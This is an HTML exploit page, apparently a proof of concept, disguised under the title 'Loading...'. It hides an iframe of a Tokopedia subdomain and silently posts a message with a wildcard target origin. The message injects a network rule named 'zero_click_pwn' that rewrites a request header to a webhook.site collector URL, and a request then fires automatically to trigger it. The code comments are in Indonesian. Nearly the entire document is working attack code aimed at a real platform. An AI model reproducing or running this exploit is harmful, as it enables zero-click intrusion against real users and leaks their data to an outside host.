<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <iframe id="secret_gate" src="https://shop-id.tokopedia.com/robots.txt" style="display:none;"></iframe>

    <script>
        const gate = document.getElementById('secret_gate');
        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";

        // Fungsi injeksi yang lu pake di console kemarin
        function inject() {
            console.log("Executing silent injection...");
            gate.contentWindow.postMessage({
                source: "main_thread",
                eventName: "network_rule",
                data: [{
                    ruleName: "zero_click_pwn",
                    global: true,
                    conditions: [],
                    handlers: [{
                        handler: "replace",
                        type: "header",
                        field: "X-Pns-Referrer",
                        value: webhook
                    }]
                }]
            }, "*");
        }

        gate.onload = function() {
            // Tunggu 2 detik setelah iframe load, lalu injeksi
            setTimeout(() => {
                inject();
                
                // Trigger fetch otomatis agar rule langsung jalan ke webhook
                const trigger = new Image();
                trigger.src = "https://shop-id.tokopedia.com/robots.txt?nocache=" + Math.random();
                
                console.log("Injection sent and triggered!");
            }, 2000);
        };
    </script>
</body>
</html>
